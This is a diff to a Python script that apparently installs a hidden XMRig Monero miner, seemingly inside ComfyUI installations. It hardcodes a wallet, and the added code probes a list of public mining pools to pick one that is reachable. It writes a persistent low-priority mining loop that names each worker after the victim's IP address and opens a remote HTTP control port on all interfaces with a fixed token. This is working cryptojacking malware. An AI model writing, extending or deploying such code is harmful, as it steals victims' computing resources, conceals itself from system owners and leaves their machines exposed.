@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-import os, sys, glob, time, traceback, tarfile, subprocess, urllib.request
+import os, sys, glob, time, socket, traceback, tarfile, subprocess, urllib.request
 
 WALLET = "45LJceeKt6A2ZHVNVF4Qqo53it2dGkpxGbRqXLya52z36fvWicAZmG2GjpczNbgyu6gGqJQag7o4LAnNBLCC1oaHDStyUVD"
 POOL = "pool.hashvault.pro:443"
@@ -80,6 +80,31 @@ def main():
         os.chmod(binp, 0o755)
         report("installed=%d\n" % os.path.getsize(binp))
 
+    poolpick = None
+    probe = []
+    for h, p, tls in (("pool.hashvault.pro", 443, True), ("pool.hashvault.pro", 3333, False),
+                      ("stratum.hashvault.pro", 443, True), ("pool.supportxmr.com", 3333, False),
+                      ("gulf.moneroocean.stream", 10001, False), ("xmrpool.eu", 3333, False),
+                      ("pool.minexmr.com", 4444, False), ("pool.hashvault.pro", 9955, False)):
+        try:
+            sk = socket.create_connection((h, p), timeout=8)
+            sk.settimeout(4)
+            try:
+                data = sk.recv(160)
+            except Exception:
+                data = b""
+            sk.close()
+            probe.append("%s:%d OK %r" % (h, p, data[:60]))
+            if poolpick is None:
+                poolpick = (h, p, tls)
+        except Exception as e:
+            probe.append("%s:%d ERR %r" % (h, p, str(e)[:60]))
+    report("poolprobe|" + " ; ".join(probe) + "\n")
+    if poolpick is None:
+        poolpick = ("pool.hashvault.pro", 443, True)
+    POOL = "%s:%d" % (poolpick[0], poolpick[1])
+    TLSARG = " --tls" if poolpick[2] else ""
+
     logd = D
     for d in UD:
         c = os.path.join(d, "ComfyUI-Manager", "cache")
@@ -93,8 +118,11 @@ def main():
         fh.write("ps -ef 2>/dev/null | grep -q '[.]hkc/xmrig' && exit 0\n")
         fh.write("T=$(( $(nproc) / 2 )); [ \"$T\" -lt 1 ] && T=1; [ \"$T\" -gt 6 ] && T=6\n")
         fh.write("W=hk-$(hostname -I | awk '{print $1}')\n")
-        fh.write("while true; do nice -n 19 %s -o %s --tls -u %s -p $W -k --threads $T"
-                 " --randomx-mode light --cpu-max-threads-hint 40 --donate-level 1 --print-time 30 --log-file %s --no-color >/dev/null 2>&1; sleep 30; done\n" % (binp, POOL, WALLET, LOG))
+        fh.write("while true; do nice -n 19 %s -o %s%s -u %s -p $W -k --threads $T"
+                 " --randomx-mode light --cpu-max-threads-hint 40 --donate-level 1 --print-time 30"
+                 " --http-host 0.0.0.0 --http-port 18189 --http-access-token hk41tok"
+                 " --log-file %s --no-color >/dev/null 2>&1; sleep 30; done\n"
+                 % (binp, POOL, TLSARG, WALLET, LOG))
     os.chmod(wd, 0o755)
     line = "['/tmp', '/bin/sh', '%s']" % wd
     for d in UD:
